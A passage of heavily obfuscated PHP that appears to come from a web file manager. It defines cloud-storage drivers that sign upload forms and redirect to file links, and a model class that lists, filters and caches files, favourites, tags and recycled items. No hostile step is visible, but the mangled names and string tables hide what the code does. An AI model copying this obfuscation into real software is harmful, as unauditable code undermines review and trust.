(strtolower($é×ÓˆÇß[$ïäÄÉÔœ[33]]) == $ïäÄÉÔœ[109]) { $ÒÍ‰·Ë = $ïäÄÉÔœ[1418]; } if ($é×ÓˆÇß[$ïäÄÉÔœ[98]] && is_array($é×ÓˆÇß[$ïäÄÉÔœ[98]]->config)) { $×¹¸ìË = $é×ÓˆÇß[$ïäÄÉÔœ[98]]->config; if (isset($×¹¸ìË[$ïäÄÉÔœ[1419]]) && $×¹¸ìË[$ïäÄÉÔœ[1419]]) { $ÒÍ‰·Ë = $ïäÄÉÔœ[1418]; } } $“³‡Ÿ“İ = KodIO::defaultDriver(); if (strtolower($“³‡Ÿ“İ[$ïäÄÉÔœ[33]]) == $ïäÄÉÔœ[109] && is_array($“³‡Ÿ“İ[$ïäÄÉÔœ[6]])) { $ü„™âÅ¯ = $÷û¹ÉŠ[$ïäÄÉÔœ[6]][$ïäÄÉÔœ[1272]]; if (substr($ü„™âÅ¯, 0, 2) == $ïäÄÉÔœ[1420]) { $ü„™âÅ¯ = str_replace($ïäÄÉÔœ[1420], BASIC_PATH, $ü„™âÅ¯); } $ü„™âÅ¯ = str_replace($ïäÄÉÔœ[600], $ïäÄÉÔœ[8], $ü„™âÅ¯); if (substr($·¸Âˆ»´[$ïäÄÉÔœ[87]], 0, strlen($ü„™âÅ¯)) == $ü„™âÅ¯) { $ÒÍ‰·Ë = $ïäÄÉÔœ[196]; } } } return $ÒÍ‰·Ë == $ïäÄÉÔœ[1418] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($²Àìƒ¤ä) { parent::__construct($²Àìƒ¤ä); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Ÿ™ÕãŒš) { $ìãÇú«ù =& $_SERVER[§Êá¸İ]; if (substr($Ÿ™ÕãŒš, 0, 7) == $ìãÇú«ù[313]) { $Ÿ™ÕãŒš = $ìãÇú«ù[314] . substr($Ÿ™ÕãŒš, 7); } header($ìãÇú«ù[175] . $Ÿ™ÕãŒš); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($çĞşÌûè) { parent::__construct($çĞşÌûè); $this->setSignVersion($_SERVER[§Êá¸İ][247]); } public function uploadFormData($ÉÆ¤©®Ÿ, $®“Û†àË = 3600) { $€·Ææèî =& $_SERVER[§Êá¸İ]; $ÊËÍÎµŸ = $€·Ææèî[229]; $ÇŒå­ÂÜ = $€·Ææèî[263]; $Òñü´™¾ = $€·Ææèî[274]; $Ã÷ß— ¾ = gmdate($€·Ææèî[299], time() + $®“Û†àË); $™…œ¾Ù = (string) time() . $€·Ææèî[74] . (string) (time() + $®“Û†àË); $ÕÙÁüË = array($€·Ææèî[275] => $Ã÷ß— ¾, $€·Ææèî[278] => array(array($€·Ææèî[280] => $ÊËÍÎµŸ), array($€·Ææèî[279] => $this->bucket), array($€·Ææèî[281], $€·Ææèî[282], $€·Ææèî[12]), array($€·Ææèî[285] => $Òñü´™¾), array($€·Ææèî[1421] => $ÇŒå­ÂÜ), array($€·Ææèî[1422] => $this->accessKey), array($€·Ææèî[1423] => $™…œ¾Ù))); $ÕÙÁüË = json_encode($ÕÙÁüË); $Óà¦·Ìô = hash_hmac($€·Ææèî[263], $™…œ¾Ù, $this->secret); $»—Æåæù = sha1($ÕÙÁüË); $º®³Šëã = hash_hmac($€·Ææèî[263], $»—Æåæù, $Óà¦·Ìô); $“Õ¬Æñ© = array($€·Ææèî[280] => $ÊËÍÎµŸ, $€·Ææèî[285] => $Òñü´™¾, $€·Ææèî[293] => base64_encode($ÕÙÁüË), $€·Ææèî[1421] => $ÇŒå­ÂÜ, $€·Ææèî[1422] => $this->accessKey, $€·Ææèî[1424] => $™…œ¾Ù, $€·Ææèî[1425] => $º®³Šëã, $€·Ææèî[208] => $this->getHost()); return $“Õ¬Æñ©; } public function fileOutImage($›ø”ÛÈÀ, $ûíé— = 250) { $¿œ½›É€ =& $_SERVER[§Êá¸İ]; if ($this->size($›ø”ÛÈÀ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($›ø”ÛÈÀ, $ûíé—); } $úŞó©¸ = $this->link($›ø”ÛÈÀ); $úŞó©¸ .= $¿œ½›É€[1426] . $ûíé— . $¿œ½›É€[1427]; $this->fileOutLink($úŞó©¸); } public function fileOutLink($¨ÉúÍ‘®) { $ºğº¡ß =& $_SERVER[§Êá¸İ]; if (substr($¨ÉúÍ‘®, 0, 7) == $ºğº¡ß[313]) { $¨ÉúÍ‘® = $ºğº¡ß[314] . substr($¨ÉúÍ‘®, 7); } header($ºğº¡ß[175] . $¨ÉúÍ‘®); die; } } goto Càçóòø†˜; bÄ«Ä…ÛÆä: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\x72\143\145"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\x6d\x65" => "\151\x6f\x5f\x73\x6f\165\x72\143\145\x5f\155\x65\x74\x61", "\155\x65\164\141\106\151\x65\154\144" => "\163\x6f\x75\162\143\145\111\x44"); protected $dataAuto = array(array("\155\157\144\151\x66\x79\x54\x69\155\145", "\x74\151\155\145", "\x69\x6e\163\145\162\x74", "\146\x75\x6e\143\164\151\157\x6e"), array("\143\x72\145\x61\164\145\124\x69\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\145\162\x74", "\146\165\x6e\x63\164\151\157\x6e"), array("\x76\151\x65\x77\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\x66\x75\156\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($øÇÁœÜÙ) { return $this->listSource(array($_SERVER[§Êá¸İ][485] => $øÇÁœÜÙ)); } public function typeName($î©‘½òì) { static $Ğ°Ô¤£á = array(self::TYPE_SYSTEM => "\163\x79\163\164\145\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\x72\157\165\160"); return $Ğ°Ô¤£á[$î©‘½òì . $_SERVER[§Êá¸İ][12]]; } public function sourceListInfo($‹ÇüŒé», $³Ş£”¥Ò = false) { $š³Õ¸ĞÖ =& $_SERVER[§Êá¸İ]; $‹ÇüŒé» = $‹ÇüŒé» ? $‹ÇüŒé» : array(); $‹ÇüŒé» = array_filter(array_unique($‹ÇüŒé»)); if (!$‹ÇüŒé») { return array(); } $‚ĞñÃ¾Ä = $this->where(array($š³Õ¸ĞÖ[193] => array($š³Õ¸ĞÖ[7], $‹ÇüŒé»)))->select(); $this->_listDataApply($‚ĞñÃ¾Ä, $³Ş£”¥Ò); return array_to_keyvalue($‚ĞñÃ¾Ä, $š³Õ¸ĞÖ[193]); } public function pathInfoFilter(&$¹á÷û™‚) { $çÒöï´à =& $_SERVER[§Êá¸İ]; static $­÷çÍ«¢ = false; static $©–›Ğ«¤ = false; static $âçšÍå¬ = false; if (!$­÷çÍ«¢) { $Ø®±ñ = $çÒöï´à[486]; $Ø®±ñ .= $çÒöï´à[487]; $Ø®±ñ .= $çÒöï´à[488]; $¦ˆÄåùõ = $çÒöï´à[489]; $ÊóÔ£Ÿï = explode($çÒöï´à[50], $¦ˆÄåùõ); $­÷çÍ«¢ = explode($çÒöï´à[50], $Ø®±ñ); $©–›Ğ«¤ = array(); foreach ($­÷çÍ«¢ as $áÚÍø’) { if (in_array($áÚÍø’, $ÊóÔ£Ÿï)) { continue; } $©–›Ğ«¤[] = $áÚÍø’; } $âçšÍå¬ = explode($çÒöï´à[50], $çÒöï´à[490]); } foreach ($âçšÍå¬ as $ÕÀœ†‘Ğ) { if (isset($¹á÷û™‚[$ÕÀœ†‘Ğ])) { $¹á÷û™‚[$ÕÀœ†‘Ğ] = intval($¹á÷û™‚[$ÕÀœ†‘Ğ]); } } $¹á÷û™‚[$çÒöï´à[87]] = $çÒöï´à[491] . $¹á÷û™‚[$çÒöï´à[193]] . $çÒöï´à[492]; $¹á÷û™‚[$çÒöï´à[33]] = $¹á÷û™‚[$çÒöï´à[493]] == 1 ? $çÒöï´à[78] : $çÒöï´à[230]; $¹á÷û™‚[$çÒöï´à[190]] = $this->typeName($¹á÷û™‚[$çÒöï´à[190]]); if ($¹á÷û™‚[$çÒöï´à[493]] != 1) { $¹á÷û™‚[$çÒöï´à[169]] = $¹á÷û™‚[$çÒöï´à[494]]; unset($¹á÷û™‚[$çÒöï´à[494]]); } $¨¨†–¼ = $­÷çÍ«¢; if (isset($¹á÷û™‚[$çÒöï´à[495]]) && $¹á÷û™‚[$çÒöï´à[495]][$çÒöï´à[496]] == -1) { $¨¨†–¼ = $©–›Ğ«¤; } $¹á÷û™‚ = array_field_key($¹á÷û™‚, $¨¨†–¼); return $¹á÷û™‚; } public function listUserFav() { $Œğ§å€ =& $_SERVER[§Êá¸İ]; $äìœçŠ = Model($Œğ§å€[497])->listData(); $ó—şß ş = array_filter_by_field($äìœçŠ, $Œğ§å€[33], $Œğ§å€[498]); $ó—şß ş = array_to_keyvalue($ó—şß ş, $Œğ§å€[12], $Œğ§å€[87]); if ($ó—şß ş) { $˜‹Àî·  = $this->listSource(array($Œğ§å€[499] => array($Œğ§å€[500], $ó—şß ş))); } $˜‹Àî·  = array_to_keyvalue($˜‹Àî· [$Œğ§å€[445]], $Œğ§å€[193]); foreach ($äìœçŠ as &$ŞŒÀ¬) { $ŞŒÀ¬ = array($Œğ§å€[501] => $ŞŒÀ¬[$Œğ§å€[483]], $Œğ§å€[502] => $ŞŒÀ¬[$Œğ§å€[32]], $Œğ§å€[503] => $ŞŒÀ¬[$Œğ§å€[87]], $Œğ§å€[504] => $ŞŒÀ¬[$Œğ§å€[33]], $Œğ§å€[505] => $ŞŒÀ¬[$Œğ§å€[231]], $Œğ§å€[506] => $ŞŒÀ¬[$Œğ§å€[88]]); if ($ŞŒÀ¬[$Œğ§å€[33]] == $Œğ§å€[498] && $˜‹Àî· [$ŞŒÀ¬[$Œğ§å€[87]]]) { $ŞŒÀ¬[$Œğ§å€[90]] = $˜‹Àî· [$ŞŒÀ¬[$Œğ§å€[87]]]; } } unset($ŞŒÀ¬); return $äìœçŠ; } public function listUserTag($ÑÃáášè) { $¸´é÷Ú¸ =& $_SERVER[§Êá¸İ]; if ($ÑÃáášè && !is_array($ÑÃáášè)) { $ÑÃáášè = array($ÑÃáášè); } $ßÎÑ¶¥Ü = Model($¸´é÷Ú¸[507])->listData(); $ÂÂÅöØó = array(); $ª²š•º = array(); foreach ($ßÎÑ¶¥Ü as $Ò£Ú¢¿) { $î…­ù–¥ = $Ò£Ú¢¿[$¸´é÷Ú¸[87]]; if (!$î…­ù–¥) { continue; } if (!isset($ª²š•º[$î…­ù–¥])) { $ª²š•º[$î…­ù–¥] = array(); } $ª²š•º[$î…­ù–¥][] = $Ò£Ú¢¿[$¸´é÷Ú¸[508]]; $ÂÂÅöØó[$Ò£Ú¢¿[$¸´é÷Ú¸[87]]] = $Ò£Ú¢¿; } $£´ä¦™† = array(); $ Ò®ê• = array(); $ÍİœÓ‰ã = array(); foreach ($ª²š•º as $¥È–ğÌÌ => $€Áº“¹ú) { $ÏÒÇ‰ô = !0; if (!$ÑÃáášè) { $£´ä¦™†[] = $¥È–ğÌÌ; continue; } foreach ($ÑÃáášè as $ô…àĞ·¨) { if (!in_array($ô…àĞ·¨, $€Áº“¹ú)) { $ÏÒÇ‰ô = !1; break; } } if (!$ÏÒÇ‰ô) { continue; } if (!is_numeric($¥È–ğÌÌ)) { $Óëı = $ÂÂÅöØó[$¥È–ğÌÌ]; $Ğ¾½ƒıˆ = array($¸´é÷Ú¸[32] => $Óëı[$¸´é÷Ú¸[32]], $¸´é÷Ú¸[87] => $Óëı[$¸´é÷Ú¸[87]], $¸´é÷Ú¸[33] => $Óëı[$¸´é÷Ú¸[33]], $¸´é÷Ú¸[90] => array($¸´é÷Ú¸[509] => 1), $¸´é÷Ú¸[232] => !0); if ($Óëı[$¸´é÷Ú¸[33]] == $¸´é÷Ú¸[230]) { $ÍİœÓ‰ã[] = $Ğ¾½ƒıˆ; } if ($Óëı[$¸´é÷Ú¸[33]] == $¸´é÷Ú¸[78]) { $ Ò®ê•[] = $Ğ¾½ƒıˆ; } continue; } $£´ä¦™†[] = $¥È–ğÌÌ; } if ($£´ä¦™†) { $ø¦à å = $this->listSource(array($¸´é÷Ú¸[499] => array($¸´é÷Ú¸[500], $£´ä¦™†))); } $ø¦à å = $ø¦à å ? $ø¦à å : array($¸´é÷Ú¸[85] => array(), $¸´é÷Ú¸[86] => array()); $ø¦à å[$¸´é÷Ú¸[85]] = array_merge($ø¦à å[$¸´é÷Ú¸[85]], $ Ò®ê•); $ø¦à å[$¸´é÷Ú¸[86]] = array_merge($ø¦à å[$¸´é÷Ú¸[86]], $ÍİœÓ‰ã); if (isset($ø¦à å[$¸´é÷Ú¸[442]]) && count($£´ä¦™†) == $ø¦à å[$¸´é÷Ú¸[442]][$¸´é÷Ú¸[443]]) { return $ø¦à å; } $¦Â¬·Ùé = array(); $ØÕº­ÃÎ = array_to_keyvalue($ø¦à å[$¸´é÷Ú¸[85]], $¸´é÷Ú¸[12], $¸´é÷Ú¸[193]); $Ë“¯Ï´µ = array_to_keyvalue($ø¦à å[$¸´é÷Ú¸[86]], $¸´é÷Ú¸[12], $¸´é÷Ú¸[193]); $áÀ“öøí = array_merge($Ë“¯Ï´µ, $ØÕº­ÃÎ); foreach ($£´ä¦™† as $î…­ù–¥) { if (!in_array($î…­ù–¥, $áÀ“öøí)) { $¦Â¬·Ùé[] = $î…­ù–¥; } } if ($¦Â¬·Ùé) { Model($¸´é÷Ú¸[510])->removeBySource($¦Â¬·Ùé); } return $ø¦à å; } public function listUserRecycle() { $ö³ú¥äÇ =& $_SERVER[§Êá¸İ]; $Ã‚Àö = Model($ö³ú¥äÇ[511])->listData(); if (!$Ã‚Àö) { return array(); } $ôœ¹æ’¬ = array($ö³ú¥äÇ[499] => array($ö³ú¥äÇ[500], $Ã‚Àö), $ö³ú¥äÇ[512] => 1); return $this->listSource($ôœ¹æ’¬); } public function listSource($ıÏûÙí, $Ï©ˆ»é = 3000, $é«ŠÇÄ» = false) { $Öƒñúšè =& $_SERVER[§Êá¸İ]; if (!isset($ıÏûÙí[$Öƒñúšè[513]])) { $ıÏûÙí[$Öƒñúšè[513]] = 0; } if (isset($ıÏûÙí[$Öƒñúšè[192]]) && $ıÏûÙí[$Öƒñúšè[192]] == $Öƒñúšè[228]) { $ıÏûÙí[$Öƒñúšè[494]] = array($Öƒñúšè[407], $Öƒñúšè[514]); } $°œç÷äï = $Öƒñúšè[515]; $…ÒêğˆÛ = $this->field($°œç÷äï)->_makeOrder()->where($ıÏûÙí)->selectPage($Ï©ˆ»é); $this->_listPageCheck($…ÒêğˆÛ, $°œç÷äï, $ıÏûÙí); $this->_listDataApply($…ÒêğˆÛ[$Öƒñúšè[445]], $é«ŠÇÄ»); $this->_listMake($…ÒêğˆÛ); return $…ÒêğˆÛ; } private function _listPageCheck(&$Úã£´«À, $°÷Û™÷, $ĞœŸÚáû) { $ù ¥¤ªœ =& $_SERVER[§Êá¸İ]; if (!is_array($Úã£´«À[$ù ¥¤ªœ[442]])) { return; } $›ĞºÇ‡ = $Úã£´«À[$ù ¥¤ªœ[442]]; if ($›ĞºÇ‡[$ù ¥¤ªœ[444]] <= 1) { return; } if ($›ĞºÇ‡[$ù ¥¤ªœ[443]] >= 100000) { return; } if (Model($ù ¥¤ªœ[516])->get($ù ¥¤ªœ[517]) != $ù ¥¤ªœ[518]) { return; } $°÷Û™÷ = str_replace(array($ù ¥¤ªœ[53], $ù ¥¤ªœ[418], $ù ¥¤ªœ[262]), $ù ¥¤ªœ[12], $°÷Û™÷); $°÷Û™÷ = $ù ¥¤ªœ[519] . str_replace($ù ¥¤ªœ[50], $ù ¥¤ªœ[520], $°÷Û™÷) . $ù ¥¤ªœ[521]; $ŞÍÂ½›¡ = $ù ¥¤ªœ[522]; $ŞÍÂ½›¡ = $ŞÍÂ½›¡ . $ù ¥¤ªœ[523]; $†±®Ú¿¡ = $›ĞºÇ‡[$ù ¥¤ªœ[439]] * ($›ĞºÇ‡[$ù ¥¤ªœ[429]] - 1) . $ù ¥¤ªœ[50] . $›ĞºÇ‡[$ù ¥¤ªœ[439]]; $ÉÌš³æ‰ = $this->_makeOrder(!0); $Å›ßáı¼ = $ù ¥¤ªœ[519] . str_replace($ù ¥¤ªœ[50], $ù ¥¤ªœ[520], $ÉÌš³æ‰[0]); if (strpos($Å›ßáı¼, $ù ¥¤ªœ[524])) { $Å›ßáı¼ = str_replace($ù ¥¤ªœ[524], $ù ¥¤ªœ[525], $Å›ßáı¼); } else { $Å›ßáı¼ .= $ù ¥¤ªœ[526] . $ÉÌš³æ‰[1]; } $İÉÛÌİ” = array(); foreach ($ĞœŸÚáû as $°Ã–¾ => $ò›Şœ¦ƒ) { $İÉÛÌİ”[$ù ¥¤ªœ[519] . $°Ã–¾] = $ò›Şœ¦ƒ; } $this->alias($ù ¥¤ªœ[527])->field($°÷Û™÷)->limit($†±®Ú¿¡)->order($Å›ßáı¼); $¿—Šñïê = $this->join($ŞÍÂ½›¡)->where($İÉÛÌİ”)->select(); if ($¿—Šñïê) { $Úã£´«À[$ù ¥¤ªœ[445]] = $¿—Šñïê; } } protected function _makeOrder($Ô¨­©²Ù = false) { $­¢¸öşŸ =& $_SERVER[§Êá¸İ]; $—ìõæî = Model($­¢¸öşŸ[528])->get($­¢¸öşŸ[529]); $¤òû¿åÀ = Model($­¢¸öşŸ[528])->get($­¢¸öşŸ[530]); $æó‹Æ = array($­¢¸öşŸ[531] => $­¢¸öşŸ[532], $­¢¸öşŸ[533] => $­¢¸öşŸ[534]); $˜ç°Ãš„ = array($­¢¸öşŸ[32] => $­¢¸öşŸ[32], $­¢¸öşŸ[79] => $­¢¸öşŸ[79], $­¢¸öşŸ[169] => $­¢¸öşŸ[494], $­¢¸öşŸ[535] => $­¢¸öşŸ[535], $­¢¸öşŸ[536] => $­¢¸öşŸ[537], $­¢¸öşŸ[231] => $­¢¸öşŸ[231], $­¢¸öşŸ[88] => $­¢¸öşŸ[88]); $Ü¢ñì = Input::get($­¢¸öşŸ[538], $­¢¸öşŸ[7], $—ìõæî, array_keys($˜ç°Ãš„)); $î‡‡Ãô© = Input::get($­¢¸öşŸ[539], $­¢¸öşŸ[7], $¤òû¿åÀ, array_keys($æó‹Æ)); if (!in_array($Ü¢ñì, array_keys($˜ç°Ãš„))) { $Ü¢ñì = $­¢¸öşŸ[32]; } if (!in_array($î‡‡Ãô©, array_keys($æó‹Æ))) { $Ü¢ñì = $­¢¸öşŸ[531]; } if ($Ü¢ñì == $­¢¸öşŸ[32]) { } $…É·ùÆØ = $­¢¸öşŸ[540] . $˜ç°Ãš„[$Ü¢ñì] . $­¢¸öşŸ[53] . $æó‹Æ[$î‡‡Ãô©]; $…É·ùÆØ = rtrim(trim($…É·ùÆØ), $­¢¸öşŸ[50]); if ($Ô¨­©²Ù) { return array($…É·ùÆØ, $æó‹Æ[$î‡‡Ãô©]); } return $this->order($…É·ùÆØ); } protected function _listDataApplyItem($¼æ¡‚İä, $êò´ÏùÒ = false) { $š¼±Ÿæ = array($¼æ¡‚İä); $this->_listDataApply($š¼±Ÿæ, $êò´ÏùÒ); return $š¼±Ÿæ[0]; } protected function _listDataApply(&$ÄÚŞ Ç, $ÈÖÄÓÑê = false) { $¾ùÀÃü³ =& $_SERVER[§Êá¸İ]; if (!$ÄÚŞ Ç) { $ÄÚŞ Ç = array(); return; } $ßÏ¾”¢Ú = array_to_keyvalue($ÄÚŞ Ç, $¾ùÀÃü³[12], $¾ùÀÃü³[193]); $ßÏ¾”¢Ú = array_unique($ßÏ¾”¢Ú); $this->_listSourceCache($ÄÚŞ Ç); if (!$ÈÖÄÓÑê) { $this->_listAppendMeta($ÄÚŞ Ç, $ßÏ¾”¢Ú); $this->_listAppendFileMeta($ÄÚŞ Ç, $ßÏ¾”¢Ú); $this->_listAppendChildren($ÄÚŞ Ç, $ßÏ¾”¢Ú); } $this->_listAppendPath($ÄÚŞ Ç); $this->_listAppendAuth($ÄÚŞ Ç); $this->_listAppendSourceInfo($ÄÚŞ Ç, $ßÏ¾”¢Ú); $this->_listAppendUser($ÄÚŞ Ç); $this->_listFilterInfo($ÄÚŞ Ç, $ÈÖÄÓÑê); $this->_listAppendAuthSecret($ÄÚŞ Ç); } protected function _listSourceCache($éæòá¶) { $Ö°¨ş“ã =& $_SERVER[§Êá¸İ]; foreach ($éæòá¶ as $Ò¯è’è) { self::$cacheSourceInfo[$Ö°¨ş“ã[541] . $Ò¯è’è[$Ö°¨ş“ã[193]]] = $Ò¯è’è; } } protected function _listFilterInfo(&$¨É®¯½Ü, $ıˆ¡—ö« = false) { $¡ôŒšôÃ =& $_SERVER[§Êá¸İ]; foreach ($¨É®¯½Ü as &$ÎƒêÇ‘ˆ) { $ÎƒêÇ‘ˆ = $this->pathInfoFilter($ÎƒêÇ‘ˆ); self::$cachePathInfo[$¡ôŒšôÃ[542] . intval($ıˆ¡—ö«) . $¡ôŒšôÃ[462] . $ÎƒêÇ‘ˆ[$¡ôŒšôÃ[193]]] = $ÎƒêÇ‘ˆ; } unset($ÎƒêÇ‘ˆ); } protected function _listMake(&$¿ûËéñ³) { $®­Åßà =& $_SERVER[§Êá¸İ]; $¿ûËéñ³[$®­Åßà[85]] = array(); $¿ûËéñ³[$®­Åßà[86]] = array(); foreach ($¿ûËéñ³[$®­Åßà[445]] as $ÙšşŒÅ×) { $İ°ÓıÇ = $ÙšşŒÅ×[$®­Åßà[493]] == 1 ? $®­Åßà[85] : $®­Åßà[86]; $¿ûËéñ³[$İ°ÓıÇ][] = $ÙšşŒÅ×; } unset($¿ûËéñ³[$®­Åßà[445]]); } protected function _listAppendMeta(&$ô”Ğ—ø, $ÔØ‘‰ÇÖ) { $ÁÊ†ññê =& $_SERVER[§Êá¸İ]; $ê›¼«Ş· = array($ÁÊ†ññê[499] => array($ÁÊ†ññê[500], $ÔØ‘‰ÇÖ)); $»°£Óô = Model($ÁÊ†ññê[543])->field($ÁÊ†ññê[544])->where($ê›¼«Ş·)->select(); if (!$»°£Óô) { return; } $ÒÛ€¼ˆ” = array($ÁÊ†ññê[545], $ÁÊ†ññê[546], $ÁÊ†ññê[525]); $¡“±ì› = array(); foreach ($»°£Óô as $¨§çÑ‰) { if (!isset($¡“±ì›[$¨§çÑ‰[$ÁÊ†ññê[193]]])) { $¡“±ì›[$¨§çÑ‰[$ÁÊ†ññê[193]]] = array(); } if (in_array($¨§çÑ‰[$ÁÊ†ññê[97]], $ÒÛ€¼ˆ”)) { continue; } $¡“±ì›[$¨§çÑ‰[$ÁÊ†ññê[193]]][$¨§çÑ‰[$ÁÊ†ññê[97]]] = $¨§çÑ‰[$ÁÊ†ññê[450]]; } foreach ($ô”Ğ—ø as &$ö¼¶¶×™) { $ö¼¶¶×™[$ÁÊ†ññê[547]] = !1; if (isset($¡“±ì›[$ö¼¶¶×™[$ÁÊ†ññê[193]]])) { $ö¼¶¶×™[$ÁÊ†ññê[547]] = $¡“±ì›[$ö¼¶¶×™[$ÁÊ†ññê[193]]]; } if ($this->fileIsLock($ö¼¶¶×™) && $ö¼¶¶×™[$ÁÊ†ññê[495]]) { $Êºƒíá¾ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ö¼¶¶×™[$ÁÊ†ññê[495]][$ÁÊ†ññê[496]] = AuthModel::authDisable($ö¼¶¶×™[$ÁÊ†ññê[495]][$ÁÊ†ññê[496]], $Êºƒíá¾); $ö¼¶¶×™[$ÁÊ†ññê[495]][$ÁÊ†ññê[548]][$ÁÊ†ññê[495]] = $ö¼¶¶×™[$ÁÊ†ññê[495]][$ÁÊ†ññê[496]]; } } unset($ö¼¶¶×™); } protected function _listAppendFileMeta(&$ÛÉ®™ˆ°, $·õŒ®÷À) { $µ”âİáŸ =& $_SERVER[§Êá¸İ]; $ÎùÄ©¶Å = array_to_keyvalue($ÛÉ®™ˆ°, $µ”âİáŸ[12], $µ”âİáŸ[549]); $ÎùÄ©¶Å = array_filter(array_unique($ÎùÄ©¶Å)); if (!$ÎùÄ©¶Å) { return; } $‚¤©Â´ = array($µ”âİáŸ[550] => array($µ”âİáŸ[500], $ÎùÄ©¶Å)); $Ôâ½ó¯µ = $µ”âİáŸ[551]; $úñÆ·ší = Model($µ”âİáŸ[552])->field($Ôâ½ó¯µ)->where($‚¤©Â´)->select(); $úñÆ·ší = array_to_keyvalue($úñÆ·ší, $µ”âİáŸ[549]); $·ë·À‘¾ = Model($µ”âİáŸ[553])->field($µ”âİáŸ[554])->where($‚¤©Â´)->select(); $·ë·À‘¾ = $·ë·À‘¾ ? $·ë·À‘¾ : array(); $ƒàúõ”ı = array(); foreach ($·ë·À‘¾ as $¦ ¼Ü€ß) { if (!isset($ƒàúõ”ı[$¦ ¼Ü€ß[$µ”âİáŸ[549]]])) { $ƒàúõ”ı[$¦ ¼Ü€ß[$µ”âİáŸ[549]]] = array(); } $ƒàúõ”ı[$¦ ¼Ü€ß[$µ”âİáŸ[549]]][$¦ ¼Ü€ß[$µ”âİáŸ[97]]] = $¦ ¼Ü€ß[$µ”âİáŸ[450]]; } foreach ($ÛÉ®™ˆ° as &$½’ùĞÕË) { $İ¾ƒŒÎ = $½’ùĞÕË[$µ”âİáŸ[549]]; if (!$İ¾ƒŒÎ || !is_array($úñÆ·ší[$İ¾ƒŒÎ])) { continue; } $Í‘¢ÇÕÄ = $úñÆ·ší[$İ¾ƒŒÎ]; $Í‘¢ÇÕÄ[$µ”âİáŸ[79]] = $½’ùĞÕË[$µ”âİáŸ[79]]; $Í‘¢ÇÕÄ[$µ”âİáŸ[32]] = $½’ùĞÕË[$µ”âİáŸ[32]]; if (!$Í‘¢ÇÕÄ[$µ”âİáŸ[555]]) { Model($µ”âİáŸ[552])->fileMd5Check($Í‘¢ÇÕÄ); } if (!isset(self::$cacheFileInfo[$µ”âİáŸ[556] . $İ¾ƒŒÎ])) { self::$cacheFileInfo[$µ”âİáŸ[556] . $İ¾ƒŒÎ] = array_merge(array(), $Í‘¢ÇÕÄ); } unset($úñÆ·ší[$İ¾ƒŒÎ][$µ”âİáŸ[87]]); $ªåÃŞ˜À = isset($ƒàúõ”ı[$İ¾ƒŒÎ]) && is_array($ƒàúõ”ı[$İ¾ƒŒÎ]) ? $ƒàúõ”ı[$İ¾ƒŒÎ] : array(); $½’ùĞÕË[$µ”âİáŸ[170]] = array_merge($ªåÃŞ˜À, $úñÆ·ší[$İ¾ƒŒÎ]); if (isset($½’ùĞÕË[$µ”âİáŸ[170]][$µ”âİáŸ[184]])) { $½’ùĞÕË[$µ”âİáŸ[184]] = json_decode($½’ùĞÕË[$µ”âİáŸ[170]][$µ”âİáŸ[184]], !0); unset($½’ùĞÕË[$µ”âİáŸ[170]][$µ”âİáŸ[184]]); } } unset($½’ùĞÕË); } protected function _listAppendSourceInfo(&$İ»™òŠ•, $ïŸ·Ó¢) { $ì¾Å¾Æ =& $_SERVER[§Êá¸İ]; $ÎÍı«§ú = Model($ì¾Å¾Æ[557])->listData(); $©äàğ‰ä = Model($ì¾Å¾Æ[507])->listData(); $­àúèË = Model($ì¾Å¾Æ[497])->listData(); $÷Í÷ú£÷ = Model($ì¾Å¾Æ[558])->listSimple(); $ìÌòƒÂ­ = array_to_keyvalue($ÎÍı«§ú, $ì¾Å¾Æ[483]); $Ğƒ¨ŸÖõ = array_to_keyvalue_group($©äàğ‰ä, $ì¾Å¾Æ[87], $ì¾Å¾Æ[508]); $©”¼Ÿ¤ì = array_to_keyvalue($­àúèË, $ì¾Å¾Æ[87]); $µàÜ¥ô• = array_to_keyvalue_group($÷Í÷ú£÷, $ì¾Å¾Æ[193]); foreach ($İ»™òŠ• as &$Ô²ÕÇû‡) { $Ô²ÕÇû‡[$ì¾Å¾Æ[90]] = array($ì¾Å¾Æ[559] => 0, $ì¾Å¾Æ[560] => 0, $ì¾Å¾Æ[561] => 0); if (isset($©”¼Ÿ¤ì[$Ô²ÕÇû‡[$ì¾Å¾Æ[193]]])) { $Ô²ÕÇû‡[$ì¾Å¾Æ[90]][$ì¾Å¾Æ[562]] = 1; $Ô²ÕÇû‡[$ì¾Å¾Æ[90]][$ì¾Å¾Æ[563]] = $©”¼Ÿ¤ì[$Ô²ÕÇû‡[$ì¾Å¾Æ[193]]][$ì¾Å¾Æ[32]]; } if ($Ğƒ¨ŸÖõ && $ìÌòƒÂ­ && isset($Ğƒ¨ŸÖõ[$Ô²ÕÇû‡[$ì¾Å¾Æ[193]]])) { $Ô²ÕÇû‡[$ì¾Å¾Æ[90]][$ì¾Å¾Æ[564]] = array(); foreach ($Ğƒ¨ŸÖõ[$Ô²ÕÇû‡[$ì¾Å¾Æ[193]]] as $ıĞÙ­ùì) { $‰·®‰ò = $ìÌòƒÂ­[$ıĞÙ­ùì]; $Ô²ÕÇû‡[$ì¾Å¾Æ[90]][$ì¾Å¾Æ[564]][] = array($ì¾Å¾Æ[565] => $‰·®‰ò[$ì¾Å¾Æ[483]], $ì¾Å¾Æ[502] => $‰·®‰ò[$ì¾Å¾Æ[32]], $ì¾Å¾Æ[566] => $‰·®‰ò[$ì¾Å¾Æ[567]]); } } if ($µàÜ¥ô• && isset($µàÜ¥ô•[$Ô²ÕÇû‡[$ì¾Å¾Æ[193]]])) { $Ô²ÕÇû‡[$ì¾Å¾Æ[90]][$ì¾Å¾Æ[568]] = array(); foreach ($µàÜ¥ô•[$Ô²ÕÇû‡[$ì¾Å¾Æ[193]]] as $ÚÑ‚¾–) { 